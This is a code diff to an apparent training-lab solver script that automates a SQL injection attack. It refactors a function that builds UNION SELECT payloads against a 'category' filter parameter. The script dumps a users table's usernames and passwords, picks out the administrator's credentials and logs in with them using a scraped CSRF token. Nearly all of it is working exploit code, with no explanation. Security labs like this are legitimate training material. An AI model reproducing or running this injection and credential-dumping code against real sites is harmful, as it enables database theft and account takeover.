@@ -13,27 +13,32 @@ class Lab(lab_04.Lab):
 
     User = NamedTuple("User", [("name", str), ("password", str)])
 
-    def columns_of_string_type(self) -> List[int]:
+    def columns_of_string_type(self, table: str = "") -> List[int]:
         """Get which columns are string types"""
         string_type_indices = []
-        for i in range(self.column_count()):
-            if self.column_is_string_type(i):
+        for i in range(self.column_count(table=table)):
+            if self.column_is_string_type(i, table=table):
                 string_type_indices.append(i)
         return string_type_indices
 
-    def dump_table(self, table: str,
-                   fields: List[str]) -> requests.models.Response:
+    def dump_table(self, fields: List[str], table: str = "",
+                   where: str = "") -> requests.models.Response:
         """Get usernames and passwords"""
         fields_str = ",+".join(fields)
-        payload = {self.key: f"'+UNION+SELECT+{fields_str}+FROM+{table}--"}
+        if table:
+            table = f"+FROM+{table}"
+        if where:
+            where = f"+WHERE+{where}"
+        payload = {self.key: f"'+UNION+SELECT+{fields_str}" \
+                             + f"{table}{where}{self.comment}"}
         payload_str = self._dict_to_str(payload)
         response = self.session.get(self.url + self.path, params=payload_str)
         response.raise_for_status()
         return response
 
     @staticmethod
-    def parse_html_table(response_text: str) -> List["Lab.User"]:
-        """parse usernames and passwords from HTML"""
+    def parse_html_user_table(response_text: str) -> List["Lab.User"]:
+        """Parse usernames and passwords from HTML"""
         username_pw = []
         soup = bs4.BeautifulSoup(response_text, features="lxml")
         table = soup.find("table", attrs={"class": "is-table-longdescription"})
@@ -57,8 +62,8 @@ def main() -> None:
     site = Lab(key="category", path="/filter")
     if site.columns_of_string_type() != [0, 1]:
         raise RuntimeError(f"Expected [0, 1]; got {site.columns_of_string_type()}")
-    response = site.dump_table("users", ["username", "password"])
-    users = site.parse_html_table(response.text)
+    response = site.dump_table(["username", "password"], "users")
+    users = site.parse_html_user_table(response.text)
     admin = [user for user in users if user.name == "administrator"][0]
     csrf = site.csrf_token("/login")
     response = site.login(admin.name, admin.password, csrf=csrf)
